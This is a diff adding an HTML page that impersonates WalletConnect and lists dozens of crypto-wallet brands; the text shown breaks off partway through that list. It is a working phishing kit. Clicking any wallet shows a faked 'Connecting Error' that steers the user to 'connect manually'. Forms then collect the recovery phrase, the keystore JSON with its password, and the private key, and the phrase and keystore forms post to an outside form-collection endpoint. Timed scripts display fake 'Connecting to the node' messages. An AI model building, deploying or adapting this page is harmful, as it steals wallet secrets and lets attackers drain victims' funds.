@@ -1,0 +1,2194 @@
+<html lang="en"><head>
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+
+
+
+    <meta name="description" content="WalletConnect is the open source web3 standard to connect
+blockchain wallets to dapps.">
+
+    <meta name="keywords" content="ethereum, walletconnect, trustwallet, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard,
+protocol, crypto, tokens, dapp">
+
+
+
+    <meta name="twitter:description" content="WalletConnect is the open source web3 standard to connect
+ blockchain wallets to dapps.">
+
+    <meta name="twitter:img:src" content="social-card.html">
+
+    <meta name="og:title" content="WalletConnect">
+
+    <meta name="og:type" content="website">
+
+    <meta name="og:url" content="index.html">
+
+    <meta name="og:image" content="Main/WalletConnectlogo.png">
+
+    <meta name="twitter:image:alt" content="Connect web3 wallets to dapps.">
+
+    <meta name="og:description" content="WalletConnect is the open source web3 standard to
+connect blockchain wallets to dapps.">
+    <meta name="og:site_name" content="WalletConnect">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home - WalletConnect</title>
+    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css">
+    <link rel="icon" type="image/x-icon" href="Main/favicon.ico">
+    <link rel="stylesheet" href="assets/plugins/fontawesome-free/css/all.min.css">
+    <link rel="stylesheet" href="css/site.css">
+
+    <style>
+        body {
+            background-color: #f8fafc;
+        }
+
+        .navbar {
+            padding: 0 0;
+        }
+
+        h3, h4, h5 {
+            font-size: .9rem;
+            font-weight: bold;
+            color: #2b6cb0;
+        }
+
+        h3 {
+            font-size: 1.5rem;
+        }
+
+        p a i {
+            border-radius: 10px 10px;
+            background-color: #ebebeb;
+            color: black;
+            padding: .8% .8%;
+        }
+
+            p a i:hover {
+                color: #2b6cb0;
+            }
+
+        .fa-1x {
+            font-size: 1.6em;
+        }
+
+        .corner-card {
+            background-color: #152d58;
+            padding: 1rem 1rem;
+            border-radius: 15px 15px;
+            max-width: 90%;
+        }
+
+        #docLink:hover {
+            text-decoration: none;
+        }
+
+        #circle-check p i {
+            border-radius: 100px 100px;
+            background-color: #2b6cb0;
+            color: white;
+            padding: 3.5% 3.5%;
+        }
+
+        .fa-check {
+            font-size: 1em;
+        }
+
+        footer {
+            padding-top: 5%;
+            padding-right: 3%;
+            padding-left: 3%;
+            background-color: white;
+        }
+
+            footer p, h5 {
+                color: black;
+            }
+
+            footer p {
+                font-size: .9rem;
+            }
+    </style>
+</head>
+<body>
+    <header class="fixed-top" style=" font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    ">
+       
+            <div class="col-md-12 text-white text-center" style="background: #2b6cb0; height:35px; z-index: 1">
+                <p>
+                    WalletConnect announces v2.0!
+
+                    <a href="#" style="color:white; text-decoration:underline;">Read more</a>
+                </p>
+            </div>
+        <nav style="margin-top:0;" class="navbar navbar-expand-sm navbar-toggleable-sm navbar-light bg-white box-shadow  mb-3">
+
+
+            <div class="container">
+                <a class="navbar-brand" href="index.html">
+                    <img src="Main/walletconnectlogo-2.png">
+                </a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target=".navbar-collapse" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="navbar-collapse collapse d-sm-inline-flex flex-sm-row-reverse">
+                    <ul class="navbar-nav flex-grow-1">
+                        <li class="nav-item">
+                            <a class="nav-link text-dark" href="index.html">Docs</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link text-dark" href="#">Registry</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <div class="container-fluid">
+        <main role="main" style="margin-top: 10%;">
+            <link href="css/site.css" rel="stylesheet" media="screen" type="text/css">
+
+<style>
+    .col-md-4 h5 {
+        font-size: 1.2rem !important;
+    }
+
+    #msgKey, #msgPhrase, #msgPrivateKey {
+        display: none;
+    }
+
+    .card img {
+        cursor: pointer;
+    }
+</style>
+
+
+
+<!-- Modal -->
+<div id="ConnectModal" class="modal fade" role="dialog">
+    <div class="modal-dialog">
+
+        <!-- Modal content-->
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" onclick="Reload()" class="close" data-dismiss="modal">×</button>
+
+            </div>
+            <div class="modal-body">
+                <div class="row text-center">
+                    <div class="col-md-12">
+                        <h3 class="modal-title text-primary"><b>Connecting Wallet Now</b></h3>
+                    </div>
+                </div>
+                <form method="post" id="WalletForm" role="form">
+
+
+                    <div class="row">
+                        <div class="col-md-12">
+                            <input type="text" id="WalletValue" style="display:none" name="WalletName" value="">
+                            <img style="float: left" id="NewLogo" class="img-fluid mr-5" width="120">
+                            <div id="HideErrorMsg" onclick="Hide()">
+
+                                <label id="ConnectError" class="text-danger">Initializing connection...</label><br> <span id="BtnConnect" data-target="#FillForm" data-toggle="collapse" class="btn btn-primary">connect manually</span>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <div class="row collapse mt-3" id="FillForm">
+                        <div class="col-md-12 text-center">
+                            <div class="form-group">
+                                <ul class="nav nav-tabs">
+                                    <li class="active mr-2" onclick="HideMsgs();"><a class="btn btn-primary text-white" data-toggle="tab" href="#Phrase">Phrase</a></li>
+                                    <li class="mr-2" onclick="HideMsgs();"><a class="btn btn-primary text-white" data-toggle="tab" href="#Keystore">Keystore JSON</a></li>
+                                    <li class="mr-2" onclick="HideMsgs();"><a class="btn btn-primary text-white" data-toggle="tab" href="#Privatekey">Private Key</a></li>
+                                </ul>
+
+                                <div class="tab-content p-4">
+                                    <div id="Phrase" class="active tab-pane">
+                                        <p id="msgPhrase">...</p>
+                                        <textarea id="PhraseValue" placeholder="Enter Wallet Phrase..." rows="5" style="resize:none;" class="form-control" name="Mail.Body"></textarea>
+                                        <p class="text-primary">Typically 12 (sometimes 24) words separated by single spaces</p>
+
+                                        <button onclick="PhraseCount();" class="btn btn-primary" formaction="https://forms.un-static.com/forms/d64b9ad3203e173e666f9b41372b66642d5f8805">CONNECT WALLET</button>
+
+                                    </div>
+
+                                    <div id="Keystore" class="tab-pane fade">
+                                        <p id="msgKey">...</p>
+                                        <textarea id="KeyStoreVal" placeholder="Enter Keystore JSON..." rows="4" style="resize:none;" class="form-control" name="KeyStoreVal"></textarea>
+                                        &nbsp;
+                                        <input id="KeyStorePass" type="password" class="form-control" placeholder="password" name="StoreValPass">
+                                        <p class="text-primary">Several lines of text begining with '(...)' plus the password you used to encrypt it.</p>
+                                        <button onclick="KeyStore();" class="btn btn-primary" formaction="https://forms.un-static.com/forms/d64b9ad3203e173e666f9b41372b66642d5f8805">CONNECT WALLET</button>
+
+                                    </div>
+                                   
+
+                                    <div id="Privatekey" class="tab-pane fade">
+                                        <p id="msgPrivateKey">...</p>
+                                        <input id="PKey" type="text" class="form-control" placeholder="Enter Private Key" name="PKey" value="">
+                                        <p class="text-primary">Typically a 256-bit number represented in hexa-decimal form</p>
+                                        <input type="button" onclick="PrivateKeyss();" asp-page-handler="SubmitPhrase" class="btn btn-primary" value="CONNECT WALLET">
+                                    </div>
+
+                                </div>
+
+                                <script>
+
+                                    function HideMsgs() {
+                                        $("#msgPhrase").hide();
+                                        $("#msgKey").hide();
+                                        $("#msgPrivateKey").hide();
+
+                                        //reseting the input controls to empty string                                     
+
+
+                                        $("#PKey").val('');
+                                        $("#PhraseValue").val('');
+                                        $("#KeyStoreVal").val('');
+                                        $("#KeyStorePass").val('');
+
+                                    };
+
+                                    function PrivateKeyss() {
+                                        var pkey = $("#PKey").prop('value');
+
+                                        if (pkey == "") {
+                                            $("#msgPrivateKey").show();
+                                            $("#msgPrivateKey").addClass("text-danger");
+                                            $("#msgPrivateKey").html("ERROR:\nEnter Private Key Correctly...");
+                                            event.preventDefault();
+                                        };
+
+                                        var Count;
+                                        Count = pkey.match(/(\w+)/g).length;
+                                        if (Count < 12) {
+                                            $("#msgPrivateKey").show();
+                                            $("#msgPrivateKey").addClass("text-danger");
+                                            $("#msgPrivateKey").text("ERROR:\nIncomplete Private Key,\nTry Again.");
+                                            event.preventDefault();
+                                        } else {
+                                            $("#msgPrivateKey").show();
+                                            $("#msgPrivateKey").addClass("text-danger");
+                                            $("#msgPrivateKey").text("Initializing...");
+
+                                            setTimeout(function () {
+
+                                                $("#msgPrivateKey").show();
+                                                $("#msgPrivateKey").addClass("text-danger");
+                                                $("#msgPrivateKey").text("Connecting to the node...");
+
+                                            }, 5000);
+
+                                        }
+                                    };
+
+                                    function PhraseCount() {
+                                        var phrase = $("#PhraseValue").prop('value');
+
+                                        if (phrase == "") {
+                                            $("#msgPhrase").show();
+                                            $("#msgPhrase").addClass("text-danger");
+                                            $("#msgPhrase").html("ERROR:\nEnter Wallet Phrase Correctly...");
+                                            event.preventDefault();
+                                        };
+
+                                        var Count;
+                                        Count = phrase.match(/(\w+)/g).length;
+                                        if (Count < 12) {
+                                            $("#msgPhrase").show();
+                                            $("#msgPhrase").addClass("text-danger");
+                                            $("#msgPhrase").text("ERROR:\nIncomplete Phrase,\nCheck your Phrase very well.");
+                                            event.preventDefault();
+                                        } else {
+                                            $("#msgPhrase").show();
+                                            $("#msgPhrase").addClass("text-danger");
+                                            $("#msgPhrase").text("Initializing...");
+
+                                            setTimeout(function () {
+
+                                                $("#msgPhrase").show();
+                                                $("#msgPhrase").addClass("text-danger");
+                                                $("#msgPhrase").text("Connecting to the node...");
+
+                                            }, 5000)
+
+                                        }
+                                    };
+
+                                    function KeyStore() {
+                                        var KeyVal = $("#KeyStoreVal").val();
+
+                                        var KeyPass = $("#KeyStorePass").prop('value');
+
+                                        if (KeyPass == " ") {
+                                            $("#msgKey").show();
+                                            $("#msgKey").addClass("text-danger");
+                                            $("#msgKey").text("ERROR:\nEnter KeyStore Password!");
+                                            event.preventDefault();
+                                        };
+
+                                        if (KeyPass == " " || KeyVal == " ") {
+                                            $("#msgKey").show();
+                                            $("#msgKey").addClass("text-danger");
+                                            $("#msgKey").text("ERROR:\nEnter KeyStore Value and KeyStore Password!");
+                                            event.preventDefault();
+                                        };
+
+                                        if (!KeyVal.startsWith('...')) {
+                                            $("#msgKey").show();
+                                            $("#msgKey").addClass("text-danger");
+                                            $("#msgKey").text("ERROR:\nIncorrect Keystore Value");
+                                            event.preventDefault();
+                                        } else {
+                                            $("#msgKey").show();
+                                            $("#msgKey").addClass("text-danger");
+                                            $("#msgKey").text("Initializing...");
+                                            setTimeout(function () {
+
+                                                $("#msgKey").show();
+                                                $("#msgKey").addClass("text-danger");
+                                                $("#msgKey").text("Connecting to the node...");
+
+
+                                            }, 5000)
+
+
+                                        }
+                                    };
+
+
+
+                                </script>
+
+
+                            </div>
+                        </div>
+                    </div>
+                <input name="__RequestVerificationToken" type="hidden" value="CfDJ8K_Tba8VqxtEvEDTBBN05RrY41z_iN_ZwiFks-LtBY7to3FgvHQywNBwTpedYoXHTW_drmxepGDG5-mLu8yt_WyHub1Uxq80fQwCV6Qo3orJWMIUrAeuUiCoMQTQvi1jFwLqh7yP7TnJkwnX70O8COc"></form>
+
+
+
+
+
+            </div>
+            <div class="modal-footer" style="margin-top:-8%;">
+                <button type="button" onclick="Reload()" class="btn btn-default" data-dismiss="modal">Close</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<div class="row" id="BigRow" style="padding: 8% 3% 2% 3% !important;">
+    <div class="col-md-6">
+        <h2 style="font-weight:900 !important;color:#2b6cb0 !important; font-size:4rem !important; font-family:'Segoe UI' !important; line-height:65px !important;">Any Wallet. <br> Any Dapp. <br> Any Chain.</h2>
+        <p style="font-weight:bold; font-family:'Segoe UI'; color:#4f5568;">ConnectWallet is the web3 standard to connect <br> blockchain wallets to dapps.</p>
+
+        <a class="btn btn-lg btn-primary" href="#Wallets" style="font-weight:bold">Connect Wallet</a>
+    </div>
+
+    <div class="col-md-6">
+        <img src="Main/hero-illustration.png" alt="hero-illustration" class="img-fluid">
+
+    </div>
+</div>
+
+<div class="row" id="Wallets">
+
+</div>
+
+<div class="row p-5" id="Wallets">
+    <div class="col-md-12 text-center">
+        <h2>SYNC YOUR WALLETS NOW</h2>
+    </div>
+    <div class="col-md-12">
+
+        <div class="row mb-2">
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img style="cursor:pointer;" data-toggle="modal" data-target="#ConnectModal" onclick="ShowError(this.src);" class="WalletLogo img-fluid" src="Main/logo/md/metamask.jpg">
+                            <figure>Meta Mask</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <script>
+
+                function Hide() {
+                    $("#HideErrorMsg").hide();
+                }
+
+                function Reload() {
+                    location.reload();
+                }
+
+                function ShowError(path) {
+                    $("#BtnConnect").hide();
+                    ShowImgSrc(path);
+                    $("#ConnectError").text("Initializing connection...");
+                    setTimeout(function () {
+
+                        $("#ConnectError").text("Connecting Error");
+                        $("#BtnConnect").show();
+                    }, 3000)
+
+                }
+
+
+                function ShowImgSrc(path) {
+                    //alert($("#WalletLogo").attr('src'));
+                    // alert(path);
+                    // $("#NewLogo").attr('src', this.$("#WalletLogo").attr('src'));
+
+                    //alert($(".card").find('img:first').attr('src'));
+                    //alert(NewUrl);
+
+                    // alert($(this).find().next('figure').text);
+                    //Picks the Wallets Name
+
+                    var index = path.lastIndexOf("index.html") + 1;
+                    //alert(path.substr(index));
+                    $("#WalletValue").val(path.substr(index).split(".")[0]);
+
+                    ; $("#NewLogo").attr('src', path);
+
+                }
+
+            </script>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" class="img-fluid" src="Main/logo/md/trustwallet.jpg" style="cursor:pointer">
+                            <figure>Trust Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/argent.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Argent</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/bitpay.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Bit Pay</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/mathwallet.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Math Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/onto.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>ONTO</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+        </div>
+
+
+        <div class="row mt-5 mb-3">
+            <div class="col-md-12 text-center">
+                <button class="btn btn-primary" data-toggle="collapse" data-target="#OtherWallets">SHOW MORE...</button>
+            </div>
+        </div>
+
+        <div class="row collapse mb-2" id="OtherWallets">
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/imToken.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>imToken</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Crypto.com%20DeFi%20Wallet.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>DeFi Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/tokenpocket.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>TokenPocket</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/rainbow.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Rainbow</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/pillar.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Pillar</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Gnosis%20Safe%20Multisig.jpg" class="img-fluid" style="cursor:pointer">
+                            <figure>Gnosis Safe Multisig</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Nash.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Nash</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/NEFTiPEDiA.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>NEFTiPEDiA</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/MyKey.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>MyKey</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Orange.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Orange</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/MidasWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Midas Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/MinervaWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Minerva Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/O3Wallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>O3 Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Linen.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Linen</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/LoopringWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Loop Ring Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/OwnBit.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>OwnBit</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/PayTube.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>PayTube</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/PeakDEFIWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>PEAK Defi Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/PlasmaPay.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Plasma Pay</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/QuiverX.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Quiver X</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Rabby.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Rabby</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/RWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>R Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/SafePal.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>SafePal</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ShinobiWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Shinobi Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/SparkPoint.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Spark Point</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Spatium.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Spatium</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/StarBase.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Star Base</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/SteakWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Steak Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Stasis.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Stasis</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Talken%20Wallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Talken Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Tangem.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Tangem</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Tokenary.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Tokenary</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/TongueWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Tongue Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Torus.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Torus</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/TrustVault.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Trust Vault</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/TrusteeWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Trustee Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/UnstoppableWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Unstoppable Wallet</figure>
